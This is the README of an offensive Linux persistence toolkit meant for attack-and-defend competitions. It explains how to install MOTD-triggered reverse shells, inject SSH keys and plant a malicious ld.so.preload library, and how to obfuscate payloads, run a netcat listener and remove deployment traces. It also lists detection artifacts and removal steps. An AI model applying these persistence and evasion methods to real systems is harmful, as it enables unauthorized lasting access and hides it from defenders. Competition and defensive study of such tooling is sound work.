# Red Team Persistence Toolkit

## Repository Structure

```
red-team-toolkit/
└─ tool/
   ├─ deploy.sh          # Main deployment wrapper for persistence installation
   ├─ ld_gen.sh          # Generates the malicious LD_PRELOAD shared library
   ├─ ld_install.sh      # Installs LD_PRELOAD persistence on the target
   ├─ motd_poison.sh     # Installs MOTD login-triggered persistence
   ├─ ssh_inject.sh      # Injects SSH public keys for persistent access
   ├─ obfuscate.sh       # XOR + Base64 payload obfuscation helper library
   ├─ archive/           # Deprecated / experimental persistence techniques
   │  ├─ at_callback.sh
   │  ├─ python_pth.sh
   │  └─ xdg_autostart.sh
   └─ README.md
```

## 1. Tool Overview

### What the Tool Does
This toolkit is a collection of lightweight Linux persistence utilities designed for use in attack-and-defend cybersecurity competitions. The toolkit allows a red team operator to quickly establish and maintain access on compromised Linux systems using several persistence mechanisms.

The primary entry point is `deploy.sh`, which automates deployment of persistence techniques across multiple target systems. The script transfers required toolkit components, installs persistence mechanisms, and performs cleanup operations.

Persistence mechanisms currently implemented include:

- MOTD execution persistence – executes payloads when a user logs in via SSH
- SSH key injection – adds a red team public key to authorized_keys files for persistent access
- LD_PRELOAD persistence – loads a malicious shared library into every process via `/etc/ld.so.preload`

The toolkit also includes a small obfuscation library used to encode payloads before writing them to system artifacts.

### Why It's Useful for Red Team
During an attack-and-defend competition, access to systems may be frequently disrupted by defensive actions such as password resets, service restarts, or host reimaging. This toolkit provides multiple persistence methods so that if one method is removed, others may remain active.

The deployment wrapper allows persistence to be rapidly redeployed across multiple hosts during competition conditions.

### Category
Persistence / Post-Exploitation Tool

### High-Level Technical Approach

1. The operator configures targets and callback parameters in `deploy.sh`.
2. The toolkit compiles a malicious shared library payload locally.
3. Files are transferred to targets using SSH/SCP.
4. Persistence methods are installed on the remote host.
5. Temporary deployment files are removed to reduce indicators.

Techniques used include:

- `/etc/update-motd.d` execution hooks
- `authorized_keys` modification
- `/etc/ld.so.preload` library injection
- Simple payload obfuscation using XOR + Base64 encoding


---

# 2. Requirements & Dependencies

### Target Operating Systems

Linux systems (tested primarily on Debian/Ubuntu based distributions).

### Required Tools on Attacker System

- bash
- ssh
- scp
- sshpass
- gcc

Install dependencies:

```
sudo apt install sshpass gcc
```

### Required Tools on Target System

Most Linux systems already include the required components:

- bash
- python3 (optional fallback reverse shell)
- SSH service

### Required Privileges

Some persistence mechanisms require elevated privileges.

| Technique | Required Privilege |
|-----------|--------------------|
| SSH key injection | User or root |
| MOTD persistence | Root |
| LD_PRELOAD persistence | Root |

### Network Prerequisites

The operator machine must be reachable from targets for reverse shell callbacks.

Example listener:

```
nc -lvnp 4444
```


---

# 3. Installation Instructions

Clone the repository:

```
git clone <repo_url>
cd red-team-toolkit/tool
```

No additional installation is required.

### Configure the Deployment Script

Edit the configuration section inside:

```
deploy.sh
```

Example configuration:

```
TARGETS=(
    "192.168.75.129"
)

USER="target"
PASSWORD="targetvm"
LHOST="192.168.75.130"
LPORT="4444"
SSH_PUBKEY="ssh-ed25519 AAAA..."
```

### Verify Successful Setup

Ensure required tools exist:

```
which sshpass
which gcc
```


---

# 4. Usage Instructions

### Basic Usage

Run the deployment wrapper:

```
./deploy.sh
```

The script will:

1. Compile the shared library payload
2. Transfer toolkit files to each target
3. Install persistence mechanisms
4. Remove temporary files

### Example Output

```
[*] Compiling ld.so.preload shared library...
[+] Compiled libdconf-update.so

============================================================
[*] Deploying to 192.168.75.129
============================================================

[*] Installing MOTD persistence...
[+] MOTD installed

[*] Injecting SSH key...
[+] SSH key injected

[*] Installing ld.so.preload persistence...
[+] Persistence Active

[*] Cleanup complete
```

### Advanced Usage

Operators may deploy individual persistence mechanisms manually.

Example MOTD persistence:

```
sudo LHOST=192.168.1.10 LPORT=4444 bash motd_poison.sh
```

SSH key injection:

```
SSH_PUBKEY="$(cat id_ed25519.pub)" bash ssh_inject.sh
```


---

# 5. Operational Notes

### Competition Use

Typical workflow during an attack-and-defend event:

1. Gain initial shell access
2. Upload toolkit
3. Run deploy script
4. Establish reverse shell listener
5. Maintain persistence while defenders attempt remediation

### OpSec Considerations

Artifacts created include:

| Artifact | Location |
|----------|----------|
| MOTD script | `/etc/update-motd.d/` |
| LD_PRELOAD entry | `/etc/ld.so.preload` |
| Shared library | `/usr/lib/x86_64-linux-gnu/` |
| SSH keys | `~/.ssh/authorized_keys` |

Temporary deployment directory:

```
/var/tmp/.dconf
```

These artifacts may appear in:

- authentication logs
- process logs
- system audit logs

### Detection Risks

Defenders may detect:

- modifications to `/etc/ld.so.preload`
- new MOTD scripts
- new SSH keys
- unusual outbound connections


### Cleanup / Removal

Remove persistence manually.

Remove MOTD persistence:

```
sudo rm /etc/update-motd.d/98-dconf-monitor
```

Remove LD_PRELOAD persistence:

Edit:

```
/etc/ld.so.preload
```

Remove the malicious library entry and delete the associated shared library.

Remove injected SSH keys:

Edit:

```
~/.ssh/authorized_keys
```

Remove the injected key.


---

# 6. Limitations

### Functional Limitations

- Requires valid SSH credentials to deploy
- Some persistence methods require root privileges
- Reverse shells rely on outbound network connectivity

### Known Issues

- LD_PRELOAD persistence may cause instability on incompatible systems
- Systems without `/etc/update-motd.d` cannot use the MOTD persistence method
- Reverse shell rate limiting may delay callbackss

---

# Archive Directory

The repository contains an `archive/` directory that stores older persistence experiments and alternative techniques. These scripts were developed during earlier iterations of the toolkit but are **not currently used in competition operations**.

They are retained for reference and potential future development but are **not part of the active deployment process and are intentionally excluded from the usage instructions in this document**.